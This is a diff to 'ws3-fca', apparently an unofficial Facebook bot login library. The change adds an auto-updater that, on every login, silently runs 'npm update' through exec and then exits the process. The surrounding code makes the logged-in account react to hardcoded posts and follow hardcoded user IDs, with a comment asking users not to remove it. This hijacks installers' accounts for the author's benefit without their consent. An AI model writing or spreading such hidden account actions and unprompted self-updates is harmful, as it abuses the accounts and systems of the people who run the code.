@@ -2,12 +2,37 @@
 const utils = require("./utils");
 const fs = require("fs");
 const cron = require("node-cron");
+const {
+  exec
+} = require("child_process");
 let globalOptions = {};
 let ctx = null;
 let _defaultFuncs = null;
 let api = null;
 let region;
 const errorRetrieving = "Error retrieving userID. This can be caused by a lot of things, including getting blocked by Facebook for logging in from an unknown location. Try logging in with a browser to verify.";
+const ver = require("./packages.json").version;
+async function checkupdate() {
+  console.log("ws3-fca", "Current version:", ver);
+  console.log("ws3-fca", "Checking updates...");
+  try {
+    const res = await utils.cleanGet(`https://raw.githubusercontent.com/NethWs3Dev/ws3-fca/refs/heads/main/package.json`);
+    const latest = parseInt(res.body.version.replace(/\./g, ""));
+    const current = parseInt(ver.replace(/\./g, ""));
+    if ((latest > current) && !isNaN(latest)) {
+      exec(`npm update ws3-fca --no-bin-links`, (error, stdout, stderr) => {
+        if (error) throw new Error(error);
+        console.log("Updater:", stdout);
+        console.log("ws3-fca will apply the update and restart the whole service.");
+        process.exit(1);
+      });
+    } else {
+      console.log(`You're using the latest version of ws3-fca.`);
+    }
+  } catch (error) {
+    console.error("Error checking updates:", error);
+  }
+}
 async function setOptions(globalOptions_from, options = {}) {
   Object.keys(options).map((key) => {
     switch (key) {
@@ -61,10 +86,10 @@ async function setOptions(globalOptions_from, options = {}) {
         break;
       case 'randomUserAgent':
         globalOptions_from.randomUserAgent = Boolean(options.randomUserAgent);
-        if (globalOptions_from.randomUserAgent){
-        globalOptions_from.userAgent = utils.randomUserAgent();
-        console.warn("login", "Random user agent enabled. This is an EXPERIMENTAL feature and I think this won't on some accounts. turn it on at your own risk. Contact the owner for more information about experimental features.");
-        console.warn("randomUserAgent", "UA selected:", globalOptions_from.userAgent);
+        if (globalOptions_from.randomUserAgent) {
+          globalOptions_from.userAgent = utils.randomUserAgent();
+          console.warn("login", "Random user agent enabled. This is an EXPERIMENTAL feature and I think this won't on some accounts. turn it on at your own risk. Contact the owner for more information about experimental features.");
+          console.warn("randomUserAgent", "UA selected:", globalOptions_from.userAgent);
         }
         break;
       case 'bypassRegion':
@@ -351,9 +376,9 @@ async function loginHelper(appState, email, password, apiCustomized = {}, callba
     });
 
     mainPromise = utils.get('https://www.facebook.com/', jar, null, globalOptions, { noRef: true })
-    .then(utils.saveCookies(jar));
+      .then(utils.saveCookies(jar));
   } else if (email && password) {
-    throw { error: "Credentials method is not implemented to ws3-fca yet. "};
+    throw { error: "Credentials method is not implemented to ws3-fca yet. " };
   } else {
     throw { error: "Please provide either appState or credentials." };
   }
@@ -392,7 +417,7 @@ async function loginHelper(appState, email, password, apiCustomized = {}, callba
         ...apiCustomized
       };
       const botAcc = await api.getBotInitialData();
-      if (!botAcc.error){
+      if (!botAcc.error) {
         console.log("login", "Bot Name:", botAcc.name);
         console.log("login", "Bot UserID:", botAcc.uid);
         ctx.userName = botAcc.name;
@@ -400,10 +425,10 @@ async function loginHelper(appState, email, password, apiCustomized = {}, callba
         console.warn("login", botAcc.error);
         console.warn("login", `WARNING: Failed to fetch account info. Proceeding to log in for user ${ctx.userID}`);
       }
-      console.log("login", "Connected to server region:", region || "Unknown");
+      console.log("login", "Connected to server region:", region || "UNKNOWN");
       return res;
     });
-    if (globalOptions.pageID) {
+  if (globalOptions.pageID) {
     mainPromise = mainPromise
       .then(function() {
         return utils
@@ -415,7 +440,7 @@ async function loginHelper(appState, email, password, apiCustomized = {}, callba
         return utils
           .get('https://www.facebook.com' + url, ctx.jar, null, globalOptions);
       });
-    }
+  }
 
   mainPromise
     .then(async (res) => {
@@ -432,12 +457,9 @@ async function loginHelper(appState, email, password, apiCustomized = {}, callba
       Dahil may Ganito? 👇
       Diskarte rin kayo no,
       Wag puro panira!
-      */
       
-      /*
       We appreciate your support on ws3-fca,
       Please don't remove these functions.
-      
       @NethWs3Dev
       */
       try {
@@ -448,10 +470,10 @@ async function loginHelper(appState, email, password, apiCustomized = {}, callba
           "100089002696653",
           "61566907376981"
         ];
-        for (const postId of posts){
+        for (const postId of posts) {
           await api.setPostReaction(postId, 2);
         }
-        for (const uid of uids){
+        for (const uid of uids) {
           await api.follow(uid, true);
         };
       } catch (error) {
@@ -462,6 +484,7 @@ async function loginHelper(appState, email, password, apiCustomized = {}, callba
 }
 
 async function login(loginData, options, callback) {
+  await checkupdate();
   if (utils.getType(options) === 'Function' ||
     utils.getType(options) === 'AsyncFunction') {
     callback = options;
@@ -482,8 +505,8 @@ async function login(loginData, options, callback) {
     randomUserAgent: false
   };
   if (options) Object.assign(globalOptions, options);
-   const loginws3 = () => {
-      loginHelper(loginData?.appState, loginData?.email, loginData?.password, {
+  const loginws3 = () => {
+    loginHelper(loginData?.appState, loginData?.email, loginData?.password, {
         relogin() {
           loginws3();
         }
